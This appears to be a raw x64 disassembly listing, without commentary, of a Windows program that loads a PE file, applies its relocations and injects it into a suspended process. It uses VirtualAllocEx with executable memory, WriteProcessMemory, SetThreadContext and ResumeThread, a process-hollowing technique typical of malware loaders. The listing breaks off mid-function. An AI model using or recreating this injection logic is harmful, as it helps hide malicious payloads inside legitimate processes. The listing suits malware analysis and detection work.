0000000140005668  mov      r14, rdx                                        
000000014000566b  mov      qword ptr [rsp + 0x30], 0                        ; 0x0
0000000140005674  mov      dword ptr [rsp + 0x28], 0x80                     ; 0x80
000000014000567c  mov      edx, 0x80000000                                  ; 0x80000000
0000000140005681  lea      r8d, [r9 + 1]                                   
0000000140005685  mov      dword ptr [rsp + 0x20], 3                        ; 0x3
000000014000568d  call     qword ptr [rip + 0x2a95]                         ; 0x140008128 KERNEL32.DLL!CreateFileA
0000000140005693  mov      rdi, rax                                        
0000000140005696  cmp      rax, -1                                          ; -0x1
000000014000569a  je       0x140005766                                      ; 0x140005766
00000001400056a0  lea      rdx, [rsp + 0x48]                               
00000001400056a5  mov      qword ptr [rsp + 0x48], 0                        ; 0x0
00000001400056ae  mov      rcx, rax                                        
00000001400056b1  call     qword ptr [rip + 0x2a19]                         ; 0x1400080d0 KERNEL32.DLL!GetFileSizeEx
00000001400056b7  test     eax, eax                                        
00000001400056b9  je       0x14000575d                                      ; 0x14000575d
00000001400056bf  mov      rbx, qword ptr [rsp + 0x48]                     
00000001400056c4  mov      ecx, 0xfffffffe                                  ; 0xfffffffe
00000001400056c9  lea      rax, [rbx - 1]                                  
00000001400056cd  cmp      rax, rcx                                        
00000001400056d0  ja       0x14000575d                                      ; 0x14000575d
00000001400056d6  mov      qword ptr [rsi], rbx                            
00000001400056d9  call     qword ptr [rip + 0x2a79]                         ; 0x140008158 KERNEL32.DLL!GetProcessHeap
00000001400056df  mov      r8, rbx                                         
00000001400056e2  xor      edx, edx                                        
00000001400056e4  mov      rcx, rax                                        
00000001400056e7  call     qword ptr [rip + 0x2a43]                         ; 0x140008130 KERNEL32.DLL!HeapAlloc
00000001400056ed  mov      qword ptr [r14], rax                            
00000001400056f0  test     rax, rax                                        
00000001400056f3  je       0x14000575d                                      ; 0x14000575d
00000001400056f5  mov      r8d, dword ptr [rsi]                            
00000001400056f8  lea      r9, [rsp + 0x40]                                
00000001400056fd  mov      rdx, rax                                        
0000000140005700  mov      dword ptr [rsp + 0x40], 0                        ; 0x0
0000000140005708  mov      rcx, rdi                                        
000000014000570b  mov      qword ptr [rsp + 0x20], 0                        ; 0x0
0000000140005714  call     qword ptr [rip + 0x29a6]                         ; 0x1400080c0 KERNEL32.DLL!ReadFile
000000014000571a  mov      rcx, rdi                                        
000000014000571d  mov      ebx, eax                                        
000000014000571f  call     qword ptr [rip + 0x2953]                         ; 0x140008078 KERNEL32.DLL!CloseHandle
0000000140005725  test     ebx, ebx                                        
0000000140005727  je       0x140005736                                      ; 0x140005736
0000000140005729  mov      ecx, dword ptr [rsp + 0x40]                     
000000014000572d  cmp      rcx, qword ptr [rsi]                            
0000000140005730  jne      0x140005736                                      ; 0x140005736
0000000140005732  mov      al, 1                                            ; 0x1
0000000140005734  jmp      0x140005768                                      ; 0x140005768
0000000140005736  mov      rbx, qword ptr [r14]                            
0000000140005739  call     qword ptr [rip + 0x2a19]                         ; 0x140008158 KERNEL32.DLL!GetProcessHeap
000000014000573f  mov      r8, rbx                                         
0000000140005742  xor      edx, edx                                        
0000000140005744  mov      rcx, rax                                        
0000000140005747  call     qword ptr [rip + 0x2993]                         ; 0x1400080e0 KERNEL32.DLL!HeapFree
000000014000574d  mov      qword ptr [r14], 0                               ; 0x0
0000000140005754  mov      qword ptr [rsi], 0                               ; 0x0
000000014000575b  jmp      0x140005766                                      ; 0x140005766
000000014000575d  mov      rcx, rdi                                        
0000000140005760  call     qword ptr [rip + 0x2912]                         ; 0x140008078 KERNEL32.DLL!CloseHandle
0000000140005766  xor      al, al                                          
0000000140005768  mov      rcx, qword ptr [rsp + 0x50]                     
000000014000576d  xor      rcx, rsp                                        
0000000140005770  call     0x1400062f0                                      ; 0x1400062f0
0000000140005775  mov      rbx, qword ptr [rsp + 0x98]                     
000000014000577d  add      rsp, 0x60                                        ; 0x60
0000000140005781  pop      r14                                             
0000000140005783  pop      rdi                                             
0000000140005784  pop      rsi                                             
0000000140005785  ret                                                      
0000000140005786  int3                                                     
0000000140005787  int3                                                     

; FUNCTION 0x140005788

0000000140005788  push     rbp                                             
000000014000578a  push     rbx                                             
000000014000578b  push     rsi                                             
000000014000578c  push     rdi                                             
000000014000578d  push     r14                                             
000000014000578f  push     r15                                             
0000000140005791  mov      rbp, rsp                                        
0000000140005794  sub      rsp, 0x48                                        ; 0x48
0000000140005798  mov      rsi, r8                                         
000000014000579b  mov      r11, rdx                                        
000000014000579e  mov      rbx, rcx                                        
00000001400057a1  test     rcx, rcx                                        
00000001400057a4  je       0x140005957                                      ; 0x140005957
00000001400057aa  xorps    xmm0, xmm0                                      
00000001400057ad  mov      byte ptr [rbp - 0x10], 0                         ; 0x0
00000001400057b1  lea      r8, [rbp - 0x28]                                
00000001400057b5  movdqu   xmmword ptr [rbp - 0x20], xmm0                  
00000001400057ba  call     0x140005334                                      ; 0x140005334
00000001400057bf  test     al, al                                          
00000001400057c1  je       0x140005957                                      ; 0x140005957
00000001400057c7  cmp      byte ptr [rbp - 0x10], 0                         ; 0x0
00000001400057cb  je       0x1400057d7                                      ; 0x1400057d7
00000001400057cd  mov      rax, qword ptr [rbp - 0x18]                     
00000001400057d1  mov      rdi, qword ptr [rax + 0x18]                     
00000001400057d5  jmp      0x1400057de                                      ; 0x1400057de
00000001400057d7  mov      rax, qword ptr [rbp - 0x20]                     
00000001400057db  mov      edi, dword ptr [rax + 0x1c]                     
00000001400057de  test     rdi, rdi                                        
00000001400057e1  je       0x140005957                                      ; 0x140005957
00000001400057e7  cmp      rsi, rdi                                        
00000001400057ea  jne      0x1400057f3                                      ; 0x1400057f3
00000001400057ec  mov      al, 1                                            ; 0x1
00000001400057ee  jmp      0x140005959                                      ; 0x140005959
00000001400057f3  lea      r8, [rbp - 0x28]                                
00000001400057f7  mov      byte ptr [rbp - 0x10], 0                         ; 0x0
00000001400057fb  mov      rdx, r11                                        
00000001400057fe  mov      rcx, rbx                                        
0000000140005801  movdqu   xmmword ptr [rbp - 0x20], xmm0                  
0000000140005806  call     0x140005334                                      ; 0x140005334
000000014000580b  test     al, al                                          
000000014000580d  je       0x140005957                                      ; 0x140005957
0000000140005813  mov      dl, byte ptr [rbp - 0x10]                       
0000000140005816  mov      r8, qword ptr [rbp - 0x20]                      
000000014000581a  mov      rcx, qword ptr [rbp - 0x18]                     
000000014000581e  test     dl, dl                                          
0000000140005820  je       0x140005827                                      ; 0x140005827
0000000140005822  mov      eax, dword ptr [rcx + 0x6c]                     
0000000140005825  jmp      0x14000582b                                      ; 0x14000582b
0000000140005827  mov      eax, dword ptr [r8 + 0x5c]                      
000000014000582b  cmp      eax, 5                                           ; 0x5
000000014000582e  jbe      0x140005957                                      ; 0x140005957
0000000140005834  add      r8, 0x88                                         ; 0x88
000000014000583b  lea      rax, [rcx + 0x98]                               
0000000140005842  test     dl, dl                                          
0000000140005844  cmovne   r8, rax                                         
0000000140005848  test     r8, r8                                          
000000014000584b  je       0x140005957                                      ; 0x140005957
0000000140005851  mov      edx, dword ptr [r8]                             
0000000140005854  test     edx, edx                                        
0000000140005856  je       0x140005957                                      ; 0x140005957
000000014000585c  cmp      dword ptr [r8 + 4], 8                            ; 0x8
0000000140005861  jb       0x140005957                                      ; 0x140005957
0000000140005867  mov      eax, edx                                        
0000000140005869  cmp      rdx, r11                                        
000000014000586c  ja       0x140005957                                      ; 0x140005957
0000000140005872  mov      rcx, r11                                        
0000000140005875  sub      rcx, rax                                        
0000000140005878  mov      eax, dword ptr [r8 + 4]                         
000000014000587c  cmp      rax, rcx                                        
000000014000587f  ja       0x140005957                                      ; 0x140005957
0000000140005885  sub      rsi, rdi                                        
0000000140005888  xor      edi, edi                                        
000000014000588a  mov      r9d, edx                                        
000000014000588d  add      r9, rdi                                         
0000000140005890  cmp      r9, r11                                         
0000000140005893  ja       0x140005957                                      ; 0x140005957
0000000140005899  mov      rax, r11                                        
000000014000589c  sub      rax, r9                                         
000000014000589f  cmp      rax, 8                                           ; 0x8
00000001400058a3  jb       0x140005957                                      ; 0x140005957
00000001400058a9  cmp      dword ptr [rbx + r9 + 4], 8                      ; 0x8
00000001400058af  jb       0x140005957                                      ; 0x140005957
00000001400058b5  mov      ecx, dword ptr [rbx + r9 + 4]                   
00000001400058ba  cmp      rcx, rax                                        
00000001400058bd  ja       0x140005957                                      ; 0x140005957
00000001400058c3  lea      r14, [rcx - 8]                                  
00000001400058c7  mov      r10d, 0                                          ; 0x0
00000001400058cd  shr      r14, 1                                           ; 0x1
00000001400058d0  lea      r15, [rbx + 8]                                  
00000001400058d4  lea      r15, [r15 + r9]                                 
00000001400058d8  je       0x14000593d                                      ; 0x14000593d
00000001400058da  movzx    eax, word ptr [r15 + r10*2]                     
00000001400058df  mov      ecx, 0x1000                                      ; 0x1000
00000001400058e4  cmp      ax, cx                                          
00000001400058e7  jb       0x140005932                                      ; 0x140005932
00000001400058e9  movzx    edx, ax                                         
00000001400058ec  and      eax, 0xfff                                       ; 0xfff
00000001400058f1  add      eax, dword ptr [rbx + r9]                       
00000001400058f5  shr      dx, 0xc                                          ; 0xc
00000001400058f9  mov      ecx, eax                                        
00000001400058fb  cmp      dx, 3                                            ; 0x3
00000001400058ff  jne      0x140005917                                      ; 0x140005917
0000000140005901  cmp      rcx, r11                                        
0000000140005904  ja       0x140005957                                      ; 0x140005957
0000000140005906  mov      rax, r11                                        
0000000140005909  sub      rax, rcx                                        
000000014000590c  cmp      rax, 4                                           ; 0x4
0000000140005910  jb       0x140005957                                      ; 0x140005957
0000000140005912  add      dword ptr [rbx + rcx], esi                      
0000000140005915  jmp      0x140005932                                      ; 0x140005932
0000000140005917  cmp      dx, 0xa                                          ; 0xa
000000014000591b  jne      0x140005957                                      ; 0x140005957
000000014000591d  cmp      rcx, r11                                        
0000000140005920  ja       0x140005957                                      ; 0x140005957
0000000140005922  mov      rax, r11                                        
0000000140005925  sub      rax, rcx                                        
0000000140005928  cmp      rax, 8                                           ; 0x8
000000014000592c  jb       0x140005957                                      ; 0x140005957
000000014000592e  add      qword ptr [rbx + rcx], rsi                      
0000000140005932  inc      r10                                             
0000000140005935  cmp      r10, r14                                        
0000000140005938  jb       0x1400058da                                      ; 0x1400058da
000000014000593a  mov      edx, dword ptr [r8]                             
000000014000593d  mov      eax, dword ptr [rbx + r9 + 4]                   
0000000140005942  add      rdi, rax                                        
0000000140005945  mov      eax, dword ptr [r8 + 4]                         
0000000140005949  cmp      rdi, rax                                        
000000014000594c  jb       0x14000588a                                      ; 0x14000588a
0000000140005952  jmp      0x1400057ec                                      ; 0x1400057ec
0000000140005957  xor      al, al                                          
0000000140005959  add      rsp, 0x48                                        ; 0x48
000000014000595d  pop      r15                                             
000000014000595f  pop      r14                                             
0000000140005961  pop      rdi                                             
0000000140005962  pop      rsi                                             
0000000140005963  pop      rbx                                             
0000000140005964  pop      rbp                                             
0000000140005965  ret                                                      
0000000140005966  int3                                                     
0000000140005967  int3                                                     

; FUNCTION 0x140005968

0000000140005968  push     rbx                                             
000000014000596a  push     rbp                                             
000000014000596b  push     rsi                                             
000000014000596c  push     rdi                                             
000000014000596d  push     r14                                             
000000014000596f  sub      rsp, 0xd0                                        ; 0xd0
0000000140005976  mov      rax, qword ptr [rip + 0x66c3]                    ; 0x14000c040
000000014000597d  xor      rax, rsp                                        
0000000140005980  mov      qword ptr [rsp + 0xc0], rax                     
0000000140005988  mov      rbp, rdx                                        
000000014000598b  mov      r14, r8                                         
000000014000598e  xor      edx, edx                                        
0000000140005990  mov      rsi, rcx                                        
0000000140005993  lea      rcx, [rsp + 0x54]                               
0000000140005998  lea      r8d, [rdx + 0x64]                               
000000014000599c  call     0x140007214                                      ; 0x140007214
00000001400059a1  xorps    xmm0, xmm0                                      
00000001400059a4  mov      dword ptr [rsp + 0x50], 0x68                     ; 0x68
00000001400059ac  xor      eax, eax                                        
00000001400059ae  mov      rcx, rsi                                        
00000001400059b1  movups   xmmword ptr [r14], xmm0                         
00000001400059b5  mov      qword ptr [r14 + 0x10], rax                     
00000001400059b9  call     0x140007220                                      ; 0x140007220
00000001400059be  mov      rcx, rbp                                        
00000001400059c1  mov      rbx, rax                                        
00000001400059c4  call     0x140007220                                      ; 0x140007220
00000001400059c9  add      rbx, rax                                        
00000001400059cc  lea      rcx, [rbx + 6]                                  
00000001400059d0  call     0x140006380                                      ; 0x140006380
00000001400059d5  mov      r9, rsi                                         
00000001400059d8  mov      qword ptr [rsp + 0x20], rbp                     
00000001400059dd  lea      r8, [rip + 0x3814]                               ; 0x1400091f8 "\"%s\" \"%s\""
00000001400059e4  mov      rcx, rax                                        
00000001400059e7  lea      rdx, [rbx + 6]                                  
00000001400059eb  mov      rdi, rax                                        
00000001400059ee  call     0x140001068                                      ; 0x140001068
00000001400059f3  mov      qword ptr [rsp + 0x48], r14                     
00000001400059f8  lea      rax, [rsp + 0x50]                               
00000001400059fd  mov      qword ptr [rsp + 0x40], rax                     
0000000140005a02  xor      esi, esi                                        
0000000140005a04  mov      qword ptr [rsp + 0x38], rsi                     
0000000140005a09  xor      r9d, r9d                                        
0000000140005a0c  mov      qword ptr [rsp + 0x30], rsi                     
0000000140005a11  xor      r8d, r8d                                        
0000000140005a14  mov      dword ptr [rsp + 0x28], 4                        ; 0x4
0000000140005a1c  mov      rdx, rdi                                        
0000000140005a1f  xor      ecx, ecx                                        
0000000140005a21  mov      dword ptr [rsp + 0x20], esi                     
0000000140005a25  call     qword ptr [rip + 0x2735]                         ; 0x140008160 KERNEL32.DLL!CreateProcessA
0000000140005a2b  mov      rcx, rdi                                        
0000000140005a2e  mov      ebx, eax                                        
0000000140005a30  call     0x140006310                                      ; 0x140006310
0000000140005a35  test     ebx, ebx                                        
0000000140005a37  setne    al                                              
0000000140005a3a  mov      rcx, qword ptr [rsp + 0xc0]                     
0000000140005a42  xor      rcx, rsp                                        
0000000140005a45  call     0x1400062f0                                      ; 0x1400062f0
0000000140005a4a  add      rsp, 0xd0                                        ; 0xd0
0000000140005a51  pop      r14                                             
0000000140005a53  pop      rdi                                             
0000000140005a54  pop      rsi                                             
0000000140005a55  pop      rbp                                             
0000000140005a56  pop      rbx                                             
0000000140005a57  ret                                                      

; FUNCTION 0x140005a58

0000000140005a58  push     rbx                                             
0000000140005a5a  sub      rsp, 0x7d0                                       ; 0x7d0
0000000140005a61  mov      rax, qword ptr [rip + 0x65d8]                    ; 0x14000c040
0000000140005a68  xor      rax, rsp                                        
0000000140005a6b  mov      qword ptr [rsp + 0x7c0], rax                    
0000000140005a73  mov      rbx, qword ptr [rcx + 8]                        
0000000140005a77  test     dl, dl                                          
0000000140005a79  je       0x140005ab0                                      ; 0x140005ab0
0000000140005a7b  xor      edx, edx                                        
0000000140005a7d  lea      rcx, [rsp + 0x24]                               
0000000140005a82  mov      r8d, 0x2c8                                       ; 0x2c8
0000000140005a88  call     0x140007214                                      ; 0x140007214
0000000140005a8d  lea      rdx, [rsp + 0x20]                               
0000000140005a92  mov      dword ptr [rsp + 0x20], 0x100002                 ; 0x100002
0000000140005a9a  mov      rcx, rbx                                        
0000000140005a9d  call     qword ptr [rip + 0x2665]                         ; 0x140008108 KERNEL32.DLL!Wow64GetThreadContext
0000000140005aa3  test     eax, eax                                        
0000000140005aa5  je       0x140005ae5                                      ; 0x140005ae5
0000000140005aa7  mov      eax, dword ptr [rsp + 0xc4]                     
0000000140005aae  jmp      0x140005af1                                      ; 0x140005af1
0000000140005ab0  xor      edx, edx                                        
0000000140005ab2  lea      rcx, [rsp + 0x2f0]                              
0000000140005aba  mov      r8d, 0x4d0                                       ; 0x4d0
0000000140005ac0  call     0x140007214                                      ; 0x140007214
0000000140005ac5  lea      rdx, [rsp + 0x2f0]                              
0000000140005acd  mov      dword ptr [rsp + 0x320], 0x100002                ; 0x100002
0000000140005ad8  mov      rcx, rbx                                        
0000000140005adb  call     qword ptr [rip + 0x2657]                         ; 0x140008138 KERNEL32.DLL!GetThreadContext
0000000140005ae1  test     eax, eax                                        
0000000140005ae3  jne      0x140005ae9                                      ; 0x140005ae9
0000000140005ae5  xor      eax, eax                                        
0000000140005ae7  jmp      0x140005af1                                      ; 0x140005af1
0000000140005ae9  mov      rax, qword ptr [rsp + 0x378]                    
0000000140005af1  mov      rcx, qword ptr [rsp + 0x7c0]                    
0000000140005af9  xor      rcx, rsp                                        
0000000140005afc  call     0x1400062f0                                      ; 0x1400062f0
0000000140005b01  add      rsp, 0x7d0                                       ; 0x7d0
0000000140005b08  pop      rbx                                             
0000000140005b09  ret                                                      
0000000140005b0a  int3                                                     
0000000140005b0b  int3                                                     

; FUNCTION 0x140005b0c

0000000140005b0c  mov      qword ptr [rsp + 0x10], rbx                     
0000000140005b11  push     rbp                                             
0000000140005b12  push     rsi                                             
0000000140005b13  push     rdi                                             
0000000140005b14  lea      rbp, [rsp - 0x710]                              
0000000140005b1c  sub      rsp, 0x810                                       ; 0x810
0000000140005b23  mov      rax, qword ptr [rip + 0x6516]                    ; 0x14000c040
0000000140005b2a  xor      rax, rsp                                        
0000000140005b2d  mov      qword ptr [rbp + 0x700], rax                    
0000000140005b34  movzx    esi, byte ptr [rbp + 0x750]                     
0000000140005b3b  mov      r11, r8                                         
0000000140005b3e  mov      qword ptr [rsp + 0x50], r8                      
0000000140005b43  xorps    xmm0, xmm0                                      
0000000140005b46  lea      r8, [rsp + 0x30]                                
0000000140005b4b  mov      byte ptr [rsp + 0x48], 0                         ; 0x0
0000000140005b50  movdqu   xmmword ptr [rsp + 0x38], xmm0                  
0000000140005b56  mov      rbx, r9                                         
0000000140005b59  call     0x140005334                                      ; 0x140005334
0000000140005b5e  test     al, al                                          
0000000140005b60  jne      0x140005b66                                      ; 0x140005b66
0000000140005b62  xor      eax, eax                                        
0000000140005b64  jmp      0x140005b7d                                      ; 0x140005b7d
0000000140005b66  cmp      byte ptr [rsp + 0x48], 0                         ; 0x0
0000000140005b6b  mov      rax, qword ptr [rsp + 0x40]                     
0000000140005b70  jne      0x140005b77                                      ; 0x140005b77
0000000140005b72  mov      rax, qword ptr [rsp + 0x38]                     
0000000140005b77  add      rax, 0x10                                        ; 0x10
0000000140005b7b  mov      eax, dword ptr [rax]                            
0000000140005b7d  mov      edi, eax                                        
0000000140005b7f  xor      edx, edx                                        
0000000140005b81  add      rdi, r11                                        
0000000140005b84  test     sil, sil                                        
0000000140005b87  je       0x140005bcc                                      ; 0x140005bcc
0000000140005b89  mov      r8d, 0x2c8                                       ; 0x2c8
0000000140005b8f  lea      rcx, [rsp + 0x64]                               
0000000140005b94  call     0x140007214                                      ; 0x140007214
0000000140005b99  mov      rcx, qword ptr [rbx + 8]                        
0000000140005b9d  lea      rdx, [rsp + 0x60]                               
0000000140005ba2  mov      dword ptr [rsp + 0x60], 0x100002                 ; 0x100002
0000000140005baa  call     qword ptr [rip + 0x2558]                         ; 0x140008108 KERNEL32.DLL!Wow64GetThreadContext
0000000140005bb0  test     eax, eax                                        
0000000140005bb2  je       0x140005c67                                      ; 0x140005c67
0000000140005bb8  mov      rcx, qword ptr [rbx + 8]                        
0000000140005bbc  lea      rdx, [rsp + 0x60]                               
0000000140005bc1  mov      dword ptr [rbp + 0x10], edi                     
0000000140005bc4  call     qword ptr [rip + 0x2626]                         ; 0x1400081f0 KERNEL32.DLL!Wow64SetThreadContext
0000000140005bca  jmp      0x140005c15                                      ; 0x140005c15
0000000140005bcc  mov      r8d, 0x4d0                                       ; 0x4d0
0000000140005bd2  lea      rcx, [rbp + 0x230]                              
0000000140005bd9  call     0x140007214                                      ; 0x140007214
0000000140005bde  mov      rcx, qword ptr [rbx + 8]                        
0000000140005be2  lea      rdx, [rbp + 0x230]                              
0000000140005be9  mov      dword ptr [rbp + 0x260], 0x100002                ; 0x100002
0000000140005bf3  call     qword ptr [rip + 0x253f]                         ; 0x140008138 KERNEL32.DLL!GetThreadContext
0000000140005bf9  test     eax, eax                                        
0000000140005bfb  je       0x140005c67                                      ; 0x140005c67
0000000140005bfd  mov      rcx, qword ptr [rbx + 8]                        
0000000140005c01  lea      rdx, [rbp + 0x230]                              
0000000140005c08  mov      qword ptr [rbp + 0x2b0], rdi                    
0000000140005c0f  call     qword ptr [rip + 0x2553]                         ; 0x140008168 KERNEL32.DLL!SetThreadContext
0000000140005c15  test     eax, eax                                        
0000000140005c17  je       0x140005c67                                      ; 0x140005c67
0000000140005c19  mov      dl, sil                                         
0000000140005c1c  mov      rcx, rbx                                        
0000000140005c1f  call     0x140005a58                                      ; 0x140005a58
0000000140005c24  test     rax, rax                                        
0000000140005c27  je       0x140005c67                                      ; 0x140005c67
0000000140005c29  mov      rcx, rsi                                        
0000000140005c2c  mov      qword ptr [rsp + 0x58], 0                        ; 0x0
0000000140005c35  xor      rcx, 1                                           ; 0x1
0000000140005c39  lea      r8, [rsp + 0x50]                                
0000000140005c3e  lea      r9, [rcx*4 + 4]                                 
0000000140005c46  inc      rcx                                             
0000000140005c49  lea      rdx, [rax + rcx*8]                              
0000000140005c4d  mov      rcx, qword ptr [rbx]                            
0000000140005c50  lea      rax, [rsp + 0x58]                               
0000000140005c55  mov      qword ptr [rsp + 0x20], rax                     
0000000140005c5a  call     qword ptr [rip + 0x2478]                         ; 0x1400080d8 KERNEL32.DLL!WriteProcessMemory
0000000140005c60  test     eax, eax                                        
0000000140005c62  setne    al                                              
0000000140005c65  jmp      0x140005c69                                      ; 0x140005c69
0000000140005c67  xor      al, al                                          
0000000140005c69  mov      rcx, qword ptr [rbp + 0x700]                    
0000000140005c70  xor      rcx, rsp                                        
0000000140005c73  call     0x1400062f0                                      ; 0x1400062f0
0000000140005c78  mov      rbx, qword ptr [rsp + 0x838]                    
0000000140005c80  add      rsp, 0x810                                       ; 0x810
0000000140005c87  pop      rdi                                             
0000000140005c88  pop      rsi                                             
0000000140005c89  pop      rbp                                             
0000000140005c8a  ret                                                      
0000000140005c8b  int3                                                     

; FUNCTION 0x140005c8c

0000000140005c8c  push     rbx                                             
0000000140005c8e  push     rbp                                             
0000000140005c8f  push     rsi                                             
0000000140005c90  push     rdi                                             
0000000140005c91  push     r14                                             
0000000140005c93  sub      rsp, 0x60                                        ; 0x60
0000000140005c97  mov      rax, qword ptr [rip + 0x63a2]                    ; 0x14000c040
0000000140005c9e  xor      rax, rsp                                        
0000000140005ca1  mov      qword ptr [rsp + 0x58], rax                     
0000000140005ca6  mov      r14b, r9b                                       
0000000140005ca9  mov      rdi, r8                                         
0000000140005cac  mov      rsi, rdx                                        
0000000140005caf  mov      rbp, rcx                                        
0000000140005cb2  test     rcx, rcx                                        
0000000140005cb5  je       0x140005d9f                                      ; 0x140005d9f
0000000140005cbb  mov      rcx, qword ptr [rdi]                            
0000000140005cbe  mov      r8, rdx                                         
0000000140005cc1  xor      edx, edx                                        
0000000140005cc3  mov      dword ptr [rsp + 0x20], 0x40                     ; 0x40
0000000140005ccb  mov      r9d, 0x3000                                      ; 0x3000
0000000140005cd1  call     qword ptr [rip + 0x2471]                         ; 0x140008148 KERNEL32.DLL!VirtualAllocEx
0000000140005cd7  mov      rbx, rax                                        
0000000140005cda  test     rax, rax                                        
0000000140005cdd  je       0x140005d9f                                      ; 0x140005d9f
0000000140005ce3  mov      r8, rax                                         
0000000140005ce6  mov      rdx, rsi                                        
0000000140005ce9  mov      rcx, rbp                                        
0000000140005cec  call     0x140005788                                      ; 0x140005788
0000000140005cf1  test     al, al                                          
0000000140005cf3  je       0x140005d9f                                      ; 0x140005d9f
0000000140005cf9  xorps    xmm0, xmm0                                      
0000000140005cfc  mov      byte ptr [rsp + 0x48], 0                         ; 0x0
0000000140005d01  lea      r8, [rsp + 0x30]                                
0000000140005d06  mov      rdx, rsi                                        
0000000140005d09  mov      rcx, rbp                                        
0000000140005d0c  movdqu   xmmword ptr [rsp + 0x38], xmm0                  
0000000140005d12  call     0x140005334                                      ; 0x140005334
0000000140005d17  test     al, al                                          
0000000140005d19  je       0x140005d9f                                      ; 0x140005d9f
0000000140005d1f  cmp      byte ptr [rsp + 0x48], 0                         ; 0x0
0000000140005d24  je       0x140005d31                                      ; 0x140005d31
0000000140005d26  mov      rax, qword ptr [rsp + 0x40]                     
0000000140005d2b  mov      qword ptr [rax + 0x18], rbx                     
0000000140005d2f  jmp      0x140005d43                                      ; 0x140005d43
0000000140005d31  mov      eax, 0xffffffff                                  ; 0xffffffff
0000000140005d36  cmp      rbx, rax                                        
0000000140005d39  ja       0x140005d9f                                      ; 0x140005d9f
0000000140005d3b  mov      rax, qword ptr [rsp + 0x38]                     
0000000140005d40  mov      dword ptr [rax + 0x1c], ebx                     
0000000140005d43  mov      rcx, qword ptr [rdi]                            
0000000140005d46  lea      rax, [rsp + 0x50]                               
0000000140005d4b  mov      r9, rsi                                         
0000000140005d4e  mov      qword ptr [rsp + 0x20], rax                     
0000000140005d53  mov      r8, rbp                                         
0000000140005d56  mov      qword ptr [rsp + 0x50], 0                        ; 0x0
0000000140005d5f  mov      rdx, rbx                                        
0000000140005d62  call     qword ptr [rip + 0x2370]                         ; 0x1400080d8 KERNEL32.DLL!WriteProcessMemory
0000000140005d68  test     eax, eax                                        
0000000140005d6a  je       0x140005d9f                                      ; 0x140005d9f
0000000140005d6c  mov      r9, rdi                                         
0000000140005d6f  mov      byte ptr [rsp + 0x20], r14b                     
0000000140005d74  mov      r8, rbx                                         
0000000140005d77  mov      rdx, rsi                                        
0000000140005d7a  mov      rcx, rbp                                        
0000000140005d7d  call     0x140005b0c                                      ; 0x140005b0c
0000000140005d82  test     al, al                                          
0000000140005d84  je       0x140005d9f                                      ; 0x140005d9f
0000000140005d86  mov      rcx, qword ptr [rdi]                            
0000000140005d89  mov      rdx, rbx                                        
0000000140005d8c  call     0x14000511c                                      ; 0x14000511c
0000000140005d91  mov      rcx, qword ptr [rdi + 8]                        
0000000140005d95  call     qword ptr [rip + 0x237d]                         ; 0x140008118 KERNEL32.DLL!ResumeThread
0000000140005d9b  mov      al, 1                                            ; 0x1
0000000140005d9d  jmp      0x140005da1                                      ; 0x140005da1
0000000140005d9f  xor      al, al                                          
0000000140005da1  mov      rcx, qword ptr [rsp + 0x58]                     
0000000140005da6  xor      rcx, rsp                                        
0000000140005da9  call     0x1400062f0                                      ; 0x1400062f0
0000000140005dae  add      rsp, 0x60                                        ; 0x60
0000000140005db2  pop      r14                                             
0000000140005db4  pop      rdi                                             
0000000140005db5  pop      rsi                                             
0000000140005db6  pop      rbp                                             
0000000140005db7  pop      rbx                                             
0000000140005db8  ret                                                      
0000000140005db9  int3                                                     
0000000140005dba  int3                                                     
0000000140005dbb  int3                                                     

; FUNCTION 0x140005dbc

0000000140005dbc  mov      qword ptr [rsp + 0x10], rbx                     
0000000140005dc1  mov      qword ptr [rsp + 0x18], rsi                     
0000000140005dc6  push     rbp                                             
0000000140005dc7  push     rdi                                             
0000000140005dc8  push     r12                                             
0000000140005dca  push     r13                                             
0000000140005dcc  push     r15                                             
0000000140005dce  mov      rbp, rsp                                        
0000000140005dd1  sub      rsp, 0x40                                        ; 0x40
0000000140005dd5  xor      r13d, r13d                                      
0000000140005dd8  mov      rax, r8                                         
0000000140005ddb  mov      r12, rdx                                        
0000000140005dde  mov      r15, rcx                                        
0000000140005de1  test     rcx, rcx                                        
0000000140005de4  je       0x140005eff                                      ; 0x140005eff
0000000140005dea  test     rax, rax                                        
0000000140005ded  je       0x140005eff                                      ; 0x140005eff
0000000140005df3  lea      r8, [rbp + 0x48]                                
0000000140005df7  mov      qword ptr [rbp + 0x30], r13                     
0000000140005dfb  lea      rdx, [rbp + 0x30]                               
0000000140005dff  mov      qword ptr [rbp + 0x48], r13                     
0000000140005e03  mov      rcx, rax                                        
0000000140005e06  call     0x140005638                                      ; 0x140005638
0000000140005e0b  test     al, al                                          
0000000140005e0d  je       0x140005eff                                      ; 0x140005eff
0000000140005e13  xorps    xmm0, xmm0                                      
0000000140005e16  mov      byte ptr [rbp - 8], r13b                        
0000000140005e1a  lea      r8, [rbp - 0x20]                                
0000000140005e1e  mov      rdx, r12                                        
0000000140005e21  mov      rcx, r15                                        
0000000140005e24  movdqu   xmmword ptr [rbp - 0x18], xmm0                  
0000000140005e29  call     0x140005334                                      ; 0x140005334
0000000140005e2e  test     al, al                                          
0000000140005e30  jne      0x140005e37                                      ; 0x140005e37
0000000140005e32  mov      ebx, r13d                                       
0000000140005e35  jmp      0x140005e4c                                      ; 0x140005e4c
0000000140005e37  mov      rax, qword ptr [rbp - 0x10]                     
0000000140005e3b  cmp      byte ptr [rbp - 8], r13b                        
0000000140005e3f  jne      0x140005e45                                      ; 0x140005e45
0000000140005e41  mov      rax, qword ptr [rbp - 0x18]                     
0000000140005e45  add      rax, 0x44                                        ; 0x44
0000000140005e49  movzx    ebx, word ptr [rax]                             
0000000140005e4c  mov      rdx, qword ptr [rbp + 0x48]                     
0000000140005e50  lea      r8, [rbp - 0x20]                                
0000000140005e54  mov      rcx, qword ptr [rbp + 0x30]                     
0000000140005e58  movdqu   xmmword ptr [rbp - 0x18], xmm0                  
0000000140005e5d  mov      byte ptr [rbp - 8], r13b                        
0000000140005e61  call     0x140005334                                      ; 0x140005334
0000000140005e66  test     al, al                                          
0000000140005e68  jne      0x140005e6f                                      ; 0x140005e6f
0000000140005e6a  mov      edi, r13d                                       
0000000140005e6d  jmp      0x140005e84                                      ; 0x140005e84
0000000140005e6f  mov      rdi, qword ptr [rbp - 0x10]                     
0000000140005e73  cmp      byte ptr [rbp - 8], r13b                        
0000000140005e77  jne      0x140005e7d                                      ; 0x140005e7d
0000000140005e79  mov      rdi, qword ptr [rbp - 0x18]                     
0000000140005e7d  add      rdi, 0x44                                        ; 0x44
0000000140005e81  movzx    edi, word ptr [rdi]                             
0000000140005e84  mov      rdx, qword ptr [rbp + 0x48]                     
